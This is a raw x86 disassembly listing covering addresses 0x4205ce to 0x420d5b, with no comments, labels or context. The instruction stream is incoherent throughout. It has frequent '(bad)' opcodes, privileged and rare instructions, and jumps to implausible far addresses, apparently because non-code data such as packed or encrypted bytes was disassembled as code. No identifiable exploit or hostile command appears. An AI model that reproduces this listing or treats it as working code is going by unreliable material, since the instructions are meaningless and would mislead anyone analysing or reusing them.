  4205ce:	mov    ebp,0xfe020de8
  4205d3:	push   cs
  4205d4:	sub    BYTE PTR [ecx+0x34],cl
  4205d7:	pop    eax
  4205d8:	inc    ecx
  4205d9:	outs   dx,DWORD PTR ds:[esi]
  4205da:	popa   
  4205db:	adc    edi,esi
  4205dd:	je     0x420585
  4205df:	test   al,0xdd
  4205e1:	xchg   BYTE PTR [ecx+0xfa419b9],ah
  4205e7:	lahf   
  4205e8:	dec    eax
  4205e9:	shl    BYTE PTR [esi-0x14],1
  4205ec:	adc    eax,0x5eae9195
  4205f1:	ror    DWORD PTR [edi+0x1b],1
  4205f4:	leave  
  4205f5:	test   al,0x7a
  4205f7:	lods   eax,DWORD PTR ds:[esi]
  4205f8:	fdiv   DWORD PTR [eax-0x77]
  4205fb:	or     esi,DWORD PTR [edx]
  4205fd:	ja     0x4205d9
  4205ff:	clc    
  420600:	fdivr  DWORD PTR [esi+0x5a]
  420603:	sahf   
  420604:	mov    dh,0xed
  420606:	rol    DWORD PTR [eax],0x28
  420609:	retf   0x90b2
  42060c:	stos   DWORD PTR es:[edi],eax
  42060d:	sti    
  42060e:	imul   eax,DWORD PTR [ebp+0x53],0x89713dd1
  420615:	cmc    
  420616:	(bad)  [eax+0x36]
  420619:	xlat   BYTE PTR ds:[ebx]
  42061a:	or     BYTE PTR ss:[edx],dh
  42061d:	pop    edx
  42061e:	sti    
  42061f:	push   esp
  420620:	jae    0x420657
  420622:	inc    edi
  420623:	das    
  420624:	lea    esi,fs:[edx]
  420627:	sub    BYTE PTR [edx-0x34],ah
  42062a:	dec    eax
  42062b:	div    DWORD PTR [edx-0x1f]
  42062e:	rcl    esp,0x25
  420631:	cwde   
  420632:	inc    esp
  420633:	jle    0x420606
  420635:	push   edi
  420636:	dec    ebx
  420637:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  420639:	dec    ebp
  42063a:	jns    0x4206b1
  42063c:	mov    edx,0x85771322
  420641:	nop
  420642:	daa    
  420643:	mov    WORD PTR [esi],cs
  420645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420646:	hlt    
  420647:	stc    
  420648:	dec    ebp
  420649:	jecxz  0x42060d
  42064b:	add    ch,BYTE PTR [edi]
  42064d:	mov    dh,0x92
  42064f:	jle    0x42064e
  420651:	fxtract 
  420653:	push   ebx
  420654:	and    eax,DWORD PTR [esi-0x2a05bef0]
  42065a:	adc    BYTE PTR [edi-0x15],0x1a
  42065e:	xchg   edx,edx
  420660:	std    
  420661:	iret   
  420662:	or     eax,0x2cbecdb7
  420667:	xchg   ebp,eax
  420668:	into   
  420669:	scas   eax,DWORD PTR es:[edi]
  42066a:	mov    edx,0x409be052
  42066f:	push   eax
  420670:	rcl    DWORD PTR [edx+0x6],0x44
  420674:	inc    edx
  420675:	dec    edx
  420676:	(bad)  
  420678:	dec    esi
  420679:	push   esi
  42067a:	and    eax,0xf6eb85f3
  42067f:	pop    ebp
  420680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420681:	fsubr  st,st(2)
  420683:	dec    ebp
  420684:	cmp    dh,BYTE PTR [edx]
  420686:	adc    eax,0x1b7643f6
  42068b:	jnp    0x42065d
  42068d:	ins    DWORD PTR es:[edi],dx
  42068e:	aaa    
  42068f:	xchg   ebp,eax
  420690:	fwait
  420691:	and    eax,0x5cb0602b
  420696:	retf   0x18a4
  420699:	(bad)  
  42069a:	retf   
  42069b:	aaa    
  42069c:	scas   eax,DWORD PTR es:[edi]
  42069d:	xchg   esp,eax
  42069e:	jl     0x42071c
  4206a0:	fwait
  4206a1:	cli    
  4206a2:	pop    ss
  4206a3:	push   cs
  4206a4:	sahf   
  4206a5:	xor    DWORD PTR [ebx+0x7a4a40d],ebx
  4206ab:	(bad)  
  4206ac:	mov    ch,0x7f
  4206ae:	mov    esp,0xc2edbf05
  4206b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206b4:	(bad)  
  4206b5:	xor    al,0xdf
  4206b7:	sti    
  4206b8:	adc    eax,0x8514e807
  4206bd:	add    eax,0xd2b09f47
  4206c2:	not    ecx
  4206c4:	jmp    0xf50b6b0c
  4206c9:	add    DWORD PTR [esi+0x64],ebx
  4206cc:	retf   
  4206cd:	push   ss
  4206ce:	xor    bh,BYTE PTR [ebx]
  4206d0:	pop    eax
  4206d1:	pop    ds
  4206d2:	sbb    ebp,DWORD PTR [ecx]
  4206d4:	out    dx,al
  4206d5:	sub    DWORD PTR [esi+ebx*1+0x4e],eax
  4206d9:	loopne 0x420726
  4206db:	dec    ebx
  4206dc:	cmp    DWORD PTR [ebp+0x3b56a711],0xea707e3d
  4206e6:	xlat   BYTE PTR ds:[ebx]
  4206e7:	xchg   edx,eax
  4206e8:	sbb    al,0x8a
  4206ea:	mov    ah,bl
  4206ec:	nop
  4206ed:	xor    DWORD PTR [eax-0x5e],edi
  4206f0:	fcomp  DWORD PTR [eax]
  4206f2:	mov    ch,0xd
  4206f4:	(bad)  
  4206f5:	lahf   
  4206f6:	sbb    ch,0x22
  4206f9:	add    eax,0xb093cc43
  4206fe:	(bad)  
  4206ff:	and    esi,ecx
  420701:	imul   edx,DWORD PTR [ebp-0x76b282f4],0xc22785f6
  42070b:	xchg   DWORD PTR [ebp-0x5d],esi
  42070e:	pop    ecx
  42070f:	test   dh,dh
  420711:	das    
  420712:	adc    BYTE PTR [ecx-0x31],bl
  420715:	test   BYTE PTR [edx+ebp*8],0xb9
  420719:	test   BYTE PTR [edx+0x53fa684f],al
  42071f:	(bad)  
  420720:	xor    DWORD PTR [edi+0x2667cd51],ecx
  420726:	mov    ch,0x15
  420728:	int    0xf7
  42072a:	mov    ecx,0x78718b19
  42072f:	dec    esp
  420730:	adc    al,0xb8
  420732:	cmp    DWORD PTR [ecx-0x5a],eax
  420735:	mov    bl,0xe2
  420737:	or     eax,0x35ab684f
  42073c:	cs mov ah,0x67
  42073f:	mov    ecx,0x98075d7c
  420744:	lods   al,BYTE PTR ds:[esi]
  420745:	push   esp
  420746:	jecxz  0x4206cc
  420748:	push   edi
  420749:	push   ecx
  42074a:	jbe    0xdab27b56
  420750:	and    eax,DWORD PTR ds:0x30611cb8
  420756:	mov    edi,0xf1344db
  42075b:	pop    ebp
  42075c:	push   ebx
  42075d:	fnsave [eax]
  42075f:	popf   
  420760:	cdq    
  420761:	sub    BYTE PTR [ecx],bl
  420763:	mov    ch,0x10
  420765:	dec    ecx
  420766:	jmp    0x303c8e24
  42076b:	push   esp
  42076c:	ins    BYTE PTR es:[edi],dx
  42076d:	inc    edi
  42076e:	ins    BYTE PTR es:[edi],dx
  42076f:	xchg   DWORD PTR [eax],eax
  420771:	addr16 xchg edx,eax
  420773:	xor    esp,DWORD PTR [edx]
  420775:	jbe    0x4207f3
  420777:	mov    ch,0xa5
  420779:	aas    
  42077a:	retf   
  42077b:	jo     0x4207a3
  42077d:	mov    dh,0xa4
  42077f:	popf   
  420780:	add    eax,0xf714391b
  420785:	popa   
  420786:	or     BYTE PTR [esi],dl
  420788:	pop    ss
  420789:	push   ebx
  42078a:	stos   DWORD PTR es:[edi],eax
  42078b:	dec    esi
  42078c:	or     BYTE PTR [esi-0x5c88f0f3],0xa9
  420793:	cmp    bh,dh
  420795:	btr    ecx,0x6
  420799:	push   edi
  42079a:	bound  edi,QWORD PTR [edi+eiz*8-0x40608e39]
  4207a1:	test   ch,ch
  4207a3:	sbb    esp,DWORD PTR [edi+0x76154f30]
  4207a9:	sub    ch,BYTE PTR [eax+0x5d]
  4207ac:	xchg   ecx,eax
  4207ad:	test   eax,0xf1a2a9db
  4207b2:	aad    0x7
  4207b4:	jns    0x4207f1
  4207b6:	inc    eax
  4207b7:	in     al,0xf2
  4207b9:	aaa    
  4207ba:	jg     0x4207e3
  4207bc:	xchg   DWORD PTR [ecx+0x125d3e6e],edx
  4207c2:	xor    DWORD PTR [ecx],ecx
  4207c4:	cli    
  4207c5:	dec    edi
  4207c6:	ficomp DWORD PTR [ebx]
  4207c8:	(bad)  
  4207ca:	repnz xchg edx,eax
  4207cc:	fld    QWORD PTR [edi]
  4207ce:	or     BYTE PTR [eax+0xf],dh
  4207d1:	mov    dh,dl
  4207d3:	icebp  
  4207d4:	jbe    0x420761
  4207d6:	push   ds
  4207d7:	cli    
  4207d8:	in     al,0xc3
  4207da:	pop    edx
  4207db:	seta   BYTE PTR es:[ecx]
  4207df:	stos   DWORD PTR es:[edi],eax
  4207e0:	pop    edx
  4207e1:	cmp    BYTE PTR [ebp+0x1bbab6da],cl
  4207e7:	sub    BYTE PTR [ecx-0x45],dh
  4207ea:	or     al,0x8d
  4207ec:	in     eax,dx
  4207ed:	cmp    esp,0x9ea61296
  4207f3:	pop    ecx
  4207f4:	shl    DWORD PTR [ebx+0x1e],cl
  4207f7:	and    BYTE PTR [ecx-0x44],dh
  4207fa:	lahf   
  4207fb:	cmp    eax,0x6347d606
  420800:	xor    eax,0x94386329
  420805:	add    BYTE PTR [edx+0x53],bl
  420808:	add    al,BYTE PTR [eax-0x40]
  42080b:	(bad)  
  42080d:	scas   al,BYTE PTR es:[edi]
  42080e:	inc    ebx
  42080f:	addr16 sar ebx,0xfc
  420813:	fldenv [ebx+0x54]
  420816:	iret   
  420817:	(bad)  
  420818:	and    cl,BYTE PTR [edi+ebp*8]
  42081b:	adc    eax,0x97126875
  420820:	pushw  es
  420822:	sub    DWORD PTR [ecx-0x66],esi
  420825:	das    
  420826:	mov    BYTE PTR [ecx-0x710c241b],dh
  42082c:	scas   al,BYTE PTR es:[edi]
  42082d:	cmpxchg al,bl
  420830:	jge    0x4207f0
  420832:	push   ebp
  420833:	mov    esi,0xf4c8f318
  420838:	cmp    eax,0x321657a8
  42083d:	push   cs
  42083e:	ret    0xfade
  420841:	xchg   DWORD PTR ds:0x4d63e8b5,edx
  420847:	sub    edx,edi
  420849:	and    BYTE PTR [ecx+edx*1],dh
  42084c:	push   ss
  42084d:	stos   BYTE PTR es:[edi],al
  42084e:	loopne 0x420823
  420850:	jno    0x420865
  420852:	inc    eax
  420853:	sti    
  420854:	xchg   edi,eax
  420855:	jp     0x4208c6
  420857:	lds    ebp,FWORD PTR [ecx+0x31]
  42085a:	add    ebp,DWORD PTR [eax-0x7d0d469c]
  420860:	cwde   
  420861:	jge    0x420885
  420863:	aam    0xb4
  420865:	pop    ecx
  420866:	(bad)  
  420867:	mov    edx,0x33b25c0f
  42086c:	sbb    eax,0x1c589380
  420871:	jno    0x420892
  420873:	ins    BYTE PTR es:[edi],dx
  420874:	lahf   
  420875:	add    edx,edi
  420877:	mov    ch,dl
  420879:	mov    BYTE PTR [edi],cl
  42087b:	imul   esp,DWORD PTR [ecx*8+0x7bf7e9ca],0x71
  420883:	jmp    0x3d33:0xbf0bc205
  42088a:	pop    es
  42088b:	xlat   BYTE PTR gs:[ebx]
  42088d:	push   ebp
  42088e:	ds leave 
  420890:	jge    0x420835
  420892:	mov    BYTE PTR [edi+0x2c42c2cc],al
  420898:	mov    cl,0x63
  42089a:	mov    esi,0x5e1f7013
  42089f:	mov    dl,0xa1
  4208a1:	mov    dl,0x76
  4208a3:	fwait
  4208a4:	mov    eax,0xe336d9dc
  4208a9:	push   esp
  4208aa:	(bad)  
  4208ab:	mov    WORD PTR [esi-0x32],?
  4208ae:	push   edi
  4208af:	test   DWORD PTR [ebp-0x6c8eba46],edx
  4208b5:	add    DWORD PTR [edx+0x5fe754a0],edx
  4208bb:	das    
  4208bc:	pusha  
  4208bd:	popa   
  4208be:	lahf   
  4208bf:	(bad)  
  4208c0:	retf   0x2c6a
  4208c3:	pushf  
  4208c4:	xlat   BYTE PTR ds:[ebx]
  4208c5:	sbb    al,0xd5
  4208c7:	lock adc bl,BYTE PTR [edi]
  4208ca:	pop    edx
  4208cb:	inc    ebp
  4208cc:	mov    dh,0xb1
  4208ce:	adc    eax,DWORD PTR [ebx-0x1a]
  4208d1:	pop    eax
  4208d2:	pop    edi
  4208d3:	push   ss
  4208d4:	fstp   QWORD PTR [eax+0x2c8dbb6a]
  4208da:	push   eax
  4208db:	stos   BYTE PTR es:[edi],al
  4208dc:	xchg   esp,eax
  4208dd:	push   ebx
  4208de:	inc    ebp
  4208df:	jae    0x4208f2
  4208e1:	mov    bh,0xb3
  4208e3:	inc    ebx
  4208e4:	sub    al,0xb1
  4208e6:	dec    esp
  4208e7:	adc    eax,0x7c6defb7
  4208ec:	test   DWORD PTR [ebp-0x78],0x4a2971a4
  4208f3:	pop    esi
  4208f4:	test   BYTE PTR [esi],0xf9
  4208f7:	mov    edi,DWORD PTR [eax]
  4208f9:	test   al,0x90
  4208fb:	inc    eax
  4208fc:	mov    ds:0x9fa4915e,eax
  420901:	jge    0x420920
  420903:	scas   eax,DWORD PTR es:[edi]
  420904:	je     0x420926
  420906:	adc    al,0x7f
  420908:	ror    ebx,cl
  42090a:	push   ds
  42090b:	cdq    
  42090c:	push   ds
  42090d:	and    esp,DWORD PTR [edx]
  42090f:	xlat   BYTE PTR ds:[ebx]
  420910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420911:	outs   dx,BYTE PTR ds:[esi]
  420912:	xor    ah,bl
  420914:	addr16 stc 
  420916:	xor    DWORD PTR [eax-0x79],ebx
  420919:	adc    DWORD PTR [ebx-0x52],ebx
  42091c:	cld    
  42091d:	and    eax,DWORD PTR [esi]
  42091f:	fwait
  420920:	(bad)  
  420921:	pushf  
  420922:	mov    ds:0xfcd3f09c,eax
  420927:	cmp    al,0xed
  420929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42092a:	out    dx,al
  42092b:	lea    ecx,[edx+0x70b3befd]
  420931:	mov    BYTE PTR [ebx+edx*1+0x1e11e150],dl
  420938:	dec    ebx
  420939:	cdq    
  42093a:	cli    
  42093b:	idiv   esi
  42093d:	or     eax,0x5e911ac9
  420942:	outs   dx,DWORD PTR ds:[esi]
  420943:	ins    BYTE PTR es:[edi],dx
  420944:	test   eax,0xc888c1aa
  420949:	aaa    
  42094a:	adc    al,0xe3
  42094c:	inc    ecx
  42094d:	cmp    al,0x8a
  42094f:	cmc    
  420950:	pop    edi
  420951:	sahf   
  420952:	neg    BYTE PTR [eax-0x47188571]
  420958:	retf   0x9268
  42095b:	and    bl,bh
  42095d:	mov    ah,0x0
  42095f:	les    esi,FWORD PTR [eax+edi*8+0x60f04e0b]
  420966:	or     BYTE PTR [edi+0x73],bl
  420969:	cdq    
  42096a:	xchg   ecx,eax
  42096b:	repz mov ebx,0x2ad22135
  420971:	es mov ecx,0xe32e0d78
  420977:	aaa    
  420978:	mov    DWORD PTR [edx+0x6d],ebp
  42097b:	out    0xd1,al
  42097d:	mov    DWORD PTR [eax-0x189216b5],esi
  420983:	ret    
  420984:	pop    esi
  420985:	test   BYTE PTR [ebp+esi*2+0x39f098e6],ch
  42098c:	mov    ds:0x44e97a91,al
  420991:	jp     0x42099d
  420993:	lea    esp,[esi+0x2a]
  420996:	push   ecx
  420997:	lea    ecx,[eax]
  420999:	or     esp,edx
  42099b:	xchg   DWORD PTR [edi+edx*2-0x16b0d001],edi
  4209a2:	dec    eax
  4209a3:	inc    edx
  4209a4:	or     ebx,DWORD PTR [ecx]
  4209a6:	(bad)  
  4209a7:	lods   eax,DWORD PTR ds:[esi]
  4209a8:	xchg   edx,eax
  4209a9:	dec    esi
  4209aa:	out    dx,al
  4209ab:	jbe    0x420955
  4209ad:	ror    DWORD PTR [eax-0x57],0xd8
  4209b1:	(bad)  
  4209b2:	push   ss
  4209b3:	or     ch,dh
  4209b5:	addr16 mov ebx,0x9a0a468b
  4209bb:	jmp    0x420a1d
  4209bd:	das    
  4209be:	lds    esp,FWORD PTR [eax]
  4209c0:	xchg   edi,eax
  4209c1:	add    BYTE PTR [edx+0x69],0x68
  4209c5:	mov    ecx,0x411fc77f
  4209ca:	cmp    esi,ebx
  4209cc:	xorps  xmm0,XMMWORD PTR [edi]
  4209cf:	out    dx,al
  4209d0:	mov    ebp,0x7266e9b7
  4209d5:	sbb    bh,BYTE PTR [edx+0x3c]
  4209d8:	leave  
  4209d9:	dec    ebp
  4209da:	jle    0x420a0a
  4209dc:	add    ah,al
  4209de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209df:	jbe    0x420991
  4209e1:	or     BYTE PTR [esi],ch
  4209e3:	xor    DWORD PTR [ecx-0x4e],esp
  4209e6:	pushf  
  4209e7:	sbb    BYTE PTR [esi+edi*2+0xe16a491],ch
  4209ee:	mov    DWORD PTR [eax-0x75],eax
  4209f1:	(bad)  
  4209f2:	sub    BYTE PTR [esi+ebp*1+0x60],ah
  4209f6:	xchg   esp,eax
  4209f7:	push   ds
  4209f8:	and    eax,0x4fec0733
  4209fd:	and    eax,0x239cde3
  420a02:	adc    esp,DWORD PTR [eax+0x6a8ae154]
  420a08:	das    
  420a09:	mov    eax,ds:0x6fdba2d8
  420a0e:	dec    edx
  420a0f:	shr    BYTE PTR [ecx],1
  420a11:	cmc    
  420a12:	sbb    ah,BYTE PTR [ebx-0xf57e280]
  420a18:	inc    ebx
  420a19:	mov    edx,0x7c34ce3b
  420a1e:	call   FWORD PTR [ebp+0x7]
  420a21:	push   cs
  420a22:	scas   eax,DWORD PTR es:[edi]
  420a23:	(bad)  
  420a24:	dec    BYTE PTR [esi]
  420a26:	jmp    0x420a12
  420a28:	mov    al,0x37
  420a2a:	cmp    ecx,DWORD PTR [esi+ebx*1-0x16193698]
  420a31:	xorps  xmm4,xmm4
  420a34:	jmp    0x420aa6
  420a36:	imul   esp,DWORD PTR [ecx+0x4a],0x7cfede78
  420a3d:	rsm    
  420a3f:	jg     0x420a1d
  420a41:	or     dh,0x91
  420a44:	xchg   ecx,eax
  420a45:	popf   
  420a46:	inc    esp
  420a47:	pop    ss
  420a48:	mov    ds:0x699c6998,eax
  420a4d:	adc    DWORD PTR [eax+0x1aca39c0],0x9054e18
  420a57:	das    
  420a58:	int    0xe0
  420a5a:	or     bh,dh
  420a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a5d:	push   es
  420a5e:	jbe    0x420a5b
  420a60:	push   esi
  420a61:	ins    BYTE PTR es:[edi],dx
  420a62:	mov    bl,0xfb
  420a64:	jmp    0xe78e0721
  420a69:	xchg   edi,eax
  420a6a:	scas   al,BYTE PTR es:[edi]
  420a6b:	xor    ecx,DWORD PTR [edi+0x71]
  420a6e:	ret    0xd441
  420a71:	adc    al,0x80
  420a73:	outs   dx,BYTE PTR ds:[esi]
  420a74:	nop
  420a75:	pop    ss
  420a76:	add    dh,BYTE PTR ds:[esi+0x35b0679a]
  420a7d:	jo     0x420a3d
  420a7f:	sub    al,dl
  420a81:	mov    esp,0xf20082a6
  420a86:	xchg   edx,eax
  420a87:	(bad)  [esi-0x3d]
  420a8a:	or     al,0xf2
  420a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a8d:	shr    BYTE PTR [eax],cl
  420a8f:	hlt    
  420a90:	sbb    ch,bl
  420a92:	mov    ecx,0x3d1a41d6
  420a97:	cmp    al,0x72
  420a99:	mov    WORD PTR [esi+0xa],?
  420a9c:	adc    eax,0x68ab5aa1
  420aa1:	les    esi,FWORD PTR [edx]
  420aa3:	sti    
  420aa4:	arpl   di,sp
  420aa6:	mov    ds,WORD PTR [edi+0x44]
  420aa9:	xchg   edx,eax
  420aaa:	push   edx
  420aab:	clc    
  420aac:	arpl   WORD PTR [eax],ax
  420aae:	push   ss
  420aaf:	es call 0x676f:0xb82abefe
  420ab7:	pop    ebx
  420ab8:	add    eax,DWORD PTR [ebx-0x71ca8f2d]
  420abe:	es out dx,eax
  420ac0:	pop    ebp
  420ac1:	aas    
  420ac2:	cmp    edx,edx
  420ac4:	inc    esi
  420ac5:	fisubr DWORD PTR [ebx+0x407f99e4]
  420acb:	pop    edi
  420acc:	mov    DWORD PTR [ebp+0x110834f2],edx
  420ad2:	dec    edi
  420ad3:	stos   BYTE PTR es:[edi],al
  420ad4:	jmp    0x420a82
  420ad6:	ret    0x5b6
  420ad9:	dec    eax
  420ada:	dec    eax
  420adb:	stc    
  420adc:	daa    
  420add:	test   dl,0x1a
  420ae0:	xor    eax,0xea9ffd1a
  420ae5:	pop    edi
  420ae6:	pop    ebx
  420ae7:	pop    esp
  420ae8:	mov    eax,0xf8343263
  420aed:	ret    0x3035
  420af0:	mov    esp,0xacfcb789
  420af5:	fild   DWORD PTR [ecx-0x2e]
  420af8:	sub    BYTE PTR ds:0x2e4b3b65,0xed
  420aff:	xor    BYTE PTR [ecx],dh
  420b01:	test   eax,0x4d775d08
  420b06:	and    esp,esp
  420b08:	shr    DWORD PTR [ebx+ebp*8-0x14a792e],0x9
  420b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b11:	fwait
  420b12:	lahf   
  420b13:	aam    0x71
  420b15:	mov    cl,0xbb
  420b17:	sbb    dl,BYTE PTR [ebx+0x7f]
  420b1a:	enter  0xc042,0x5a
  420b1e:	mov    bh,BYTE PTR [edx]
  420b20:	jnp    0x420b2a
  420b22:	jne    0x420b62
  420b24:	sub    BYTE PTR [ebx+0x4d],cl
  420b27:	xchg   ebx,eax
  420b28:	call   0x7a985d01
  420b2d:	mov    WORD PTR [edx+0x6ab7d169],cs
  420b33:	test   eax,0x72c42127
  420b38:	dec    esp
  420b39:	int    0x7c
  420b3b:	xchg   DWORD PTR [edx-0x76],ebp
  420b3e:	mov    ds:0x9ad73d16,al
  420b43:	or     al,0xde
  420b45:	jecxz  0x420b65
  420b47:	mov    al,0x9f
  420b49:	into   
  420b4a:	popa   
  420b4b:	xchg   ecx,eax
  420b4c:	sub    eax,0xebb4245f
  420b51:	jb     0x420bd2
  420b53:	or     al,0x98
  420b55:	xor    DWORD PTR [eax],0xd3ec86e3
  420b5b:	push   esp
  420b5c:	inc    edx
  420b5d:	sbb    ah,BYTE PTR [ecx-0x28]
  420b60:	jmp    0x420b91
  420b62:	popa   
  420b63:	fist   DWORD PTR [ebx+0x58]
  420b66:	push   edx
  420b67:	outs   dx,DWORD PTR ds:[esi]
  420b68:	fnstsw WORD PTR [ecx]
  420b6a:	xchg   edx,eax
  420b6b:	fadd   DWORD PTR [ecx+0xb0c566f]
  420b71:	jmp    0xdb77:0x99b45adc
  420b78:	dec    ebp
  420b79:	shr    BYTE PTR [esi],1
  420b7b:	les    ecx,FWORD PTR [edx]
  420b7d:	or     eax,0x325e2a2b
  420b82:	mov    ebx,0x7edf4ee
  420b87:	fild   QWORD PTR [edx]
  420b89:	sbb    ch,BYTE PTR [ebp+0x4]
  420b8c:	xchg   esi,eax
  420b8d:	mov    edi,0xba5530ed
  420b92:	out    dx,eax
  420b93:	cld    
  420b94:	into   
  420b95:	loop   0x420b17
  420b97:	mov    ds:0xc5249307,eax
  420b9c:	js     0x420b30
  420b9e:	pcmpgtb mm2,QWORD PTR [edx-0xee663f3]
  420ba5:	jl     0x420b78
  420ba7:	pop    ebp
  420ba8:	xor    eax,0x14badf85
  420bad:	push   ecx
  420bae:	and    ebp,ecx
  420bb0:	or     al,0xa0
  420bb2:	icebp  
  420bb3:	icebp  
  420bb4:	add    edx,ebp
  420bb6:	jo     0x420be7
  420bb8:	adc    al,0x57
  420bba:	iret   
  420bbb:	jmp    0x420bd8
  420bbd:	jmp    0xf5fc:0xf578f2a6
  420bc4:	push   ecx
  420bc5:	jno    0x420b9b
  420bc7:	repnz in al,dx
  420bc9:	fs cmp eax,0x9e4d71d2
  420bcf:	rcl    DWORD PTR [esi+eiz*1+0x1d],cl
  420bd3:	sar    BYTE PTR [edx],1
  420bd5:	jmp    0x9889:0x7a2bb4
  420bdc:	xchg   ecx,eax
  420bdd:	xchg   edi,eax
  420bde:	push   ebp
  420bdf:	or     BYTE PTR [edi],0x9d
  420be2:	dec    esp
  420be3:	mov    ch,0x36
  420be5:	mov    ss,WORD PTR [ecx]
  420be7:	dec    edi
  420be8:	(bad)  
  420be9:	data16 (bad) 
  420beb:	cmp    DWORD PTR [ecx+0xe],eax
  420bee:	xchg   esi,eax
  420bef:	xor    dh,BYTE PTR [ecx+eax*4-0x3d]
  420bf3:	jns    0x420c48
  420bf5:	sbb    DWORD PTR [eax],ebp
  420bf7:	cmp    BYTE PTR [ebx+ebp*1+0x6fcbdb44],0xec
  420bff:	call   DWORD PTR [ebp+0x55]
  420c02:	cmp    BYTE PTR [ecx],bh
  420c04:	mov    eax,0x258525fa
  420c09:	rcr    cl,1
  420c0b:	push   ecx
  420c0c:	(bad)
  420c0f:	(bad)  
  420c10:	into   
  420c11:	xlat   BYTE PTR ds:[ebx]
  420c12:	fiadd  DWORD PTR [eax+0xdc5891]
  420c18:	cmp    eax,0xa6911ee9
  420c1d:	iret   
  420c1e:	pop    eax
  420c1f:	xchg   BYTE PTR [esi+eiz*2],ch
  420c22:	pop    edi
  420c23:	mov    dh,0xc8
  420c25:	lds    ecx,FWORD PTR [esi+eiz*2]
  420c28:	aas    
  420c29:	loop   0x420ca1
  420c2b:	aaa    
  420c2c:	sub    al,0x7c
  420c2e:	mov    DWORD PTR [ecx+0x4dec300d],edi
  420c34:	popf   
  420c35:	out    0x91,al
  420c37:	bound  edi,QWORD PTR [edi+0x31]
  420c3a:	jg     0x420c44
  420c3c:	or     edx,esi
  420c3e:	int3   
  420c3f:	cs ds dec esi
  420c42:	div    DWORD PTR [ecx+esi*2]
  420c45:	inc    ebx
  420c46:	leave  
  420c47:	cdq    
  420c48:	(bad)  [esi+0x44]
  420c4b:	mov    ebx,0x8c2027d9
  420c50:	add    DWORD PTR [edx-0x44c4f132],0xc3a7af4
  420c5a:	(bad)  
  420c5b:	scas   eax,DWORD PTR es:[edi]
  420c5c:	dec    ecx
  420c5d:	push   esi
  420c5e:	pop    ebp
  420c5f:	sar    DWORD PTR [edi],0x98
  420c62:	jae    0x420bf8
  420c64:	and    ebx,ebx
  420c66:	jge    0x420c20
  420c68:	dec    edx
  420c69:	(bad)  
  420c6a:	jecxz  0x420c06
  420c6c:	add    eax,0x74f67e84
  420c71:	retf   
  420c72:	jmp    0x9735d25b
  420c77:	nop
  420c78:	add    al,cl
  420c7a:	repz sub BYTE PTR [esi-0x6e],0x5d
  420c7f:	ret    0x3bee
  420c82:	xor    DWORD PTR ds:0xcf33b084,eax
  420c88:	aas    
  420c89:	in     eax,dx
  420c8a:	sbb    ah,BYTE PTR [esp+edi*4+0x28b8a010]
  420c91:	adc    al,0xab
  420c93:	nop
  420c94:	into   
  420c95:	leave  
  420c96:	loopne 0x420cea
  420c98:	outs   dx,DWORD PTR ds:[esi]
  420c99:	pop    esi
  420c9a:	pop    edx
  420c9b:	ja     0x420d03
  420c9d:	fwait
  420c9e:	cmp    ch,BYTE PTR [eax-0x20]
  420ca1:	test   ah,ah
  420ca3:	inc    esi
  420ca4:	cmp    DWORD PTR [esi],0x5ac3cc8
  420caa:	push   ecx
  420cab:	and    eax,0xff9c8ddf
  420cb0:	imul   edx,DWORD PTR [esi+eiz*1],0x3e
  420cb4:	mov    cl,0x6a
  420cb6:	mov    fs,esi
  420cb8:	mov    edx,0x12e03e7
  420cbd:	push   edx
  420cbe:	mov    ds:0x7b0885e9,eax
  420cc3:	sbb    DWORD PTR [esi],eax
  420cc5:	stos   DWORD PTR es:[edi],eax
  420cc6:	out    dx,eax
  420cc7:	fwait
  420cc8:	sbb    BYTE PTR [edx],ah
  420cca:	jmp    0x640a0304
  420ccf:	inc    dx
  420cd1:	inc    BYTE PTR [eax-0x6ae23f8a]
  420cd7:	add    ch,al
  420cd9:	sub    ecx,DWORD PTR [eax+0x6dfcea20]
  420cdf:	push   eax
  420ce0:	push   esi
  420ce1:	sar    DWORD PTR [esi],0x6f
  420ce4:	rcl    BYTE PTR [edi],0x89
  420ce7:	pop    ecx
  420ce8:	mov    al,ds:0x7eda8fd8
  420ced:	mov    BYTE PTR [ecx+0xb],0xee
  420cf1:	das    
  420cf2:	test   BYTE PTR [edx],al
  420cf4:	ret    0x767b
  420cf7:	and    DWORD PTR [eax+0x7],edi
  420cfa:	add    eax,0x6fe95f7c
  420cff:	jmp    0x420cae
  420d01:	test   eax,0x3fd2b4c9
  420d06:	fs dec ebp
  420d08:	inc    eax
  420d09:	not    DWORD PTR [eax]
  420d0b:	arpl   WORD PTR [eax],dx
  420d0d:	dec    edi
  420d0e:	pop    ds
  420d0f:	test   DWORD PTR [edx],eax
  420d11:	pop    ss
  420d12:	scas   eax,DWORD PTR es:[edi]
  420d13:	inc    edx
  420d14:	mov    fs,esp
  420d16:	dec    ecx
  420d17:	sahf   
  420d18:	mov    bl,ch
  420d1a:	sbb    edx,DWORD PTR [eax+esi*1+0x61]
  420d1e:	and    ebx,ecx
  420d20:	out    dx,al
  420d21:	into   
  420d22:	and    edx,esi
  420d24:	sbb    edi,ebp
  420d26:	psllq  mm3,QWORD PTR [eax+0x7af9210f]
  420d2d:	inc    ebx
  420d2e:	push   0xee156112
  420d33:	jnp    0x420cfd
  420d35:	(bad)  
  420d36:	cmp    al,dl
  420d38:	and    ch,BYTE PTR [eax]
  420d3a:	test   DWORD PTR [ebx-0x26],edi
  420d3d:	aaa    
  420d3e:	into   
  420d3f:	aas    
  420d40:	mul    BYTE PTR [edx]
  420d42:	arpl   WORD PTR [edi-0x49],dx
  420d45:	test   DWORD PTR [eax+ebx*4-0x34],ebp
  420d49:	mov    bl,0x70
  420d4b:	cmp    DWORD PTR [ecx],esi
  420d4d:	ja     0x420cfa
  420d4f:	sub    DWORD PTR [edi+0x1cec23b5],0xffffffdd
  420d56:	xor    al,0x2e
  420d58:	xchg   edx,eax
  420d59:	xchg   esp,eax
  420d5a:	xlat   BYTE PTR ds:[ebx]
  420d5b:	call   0xe1b16f99
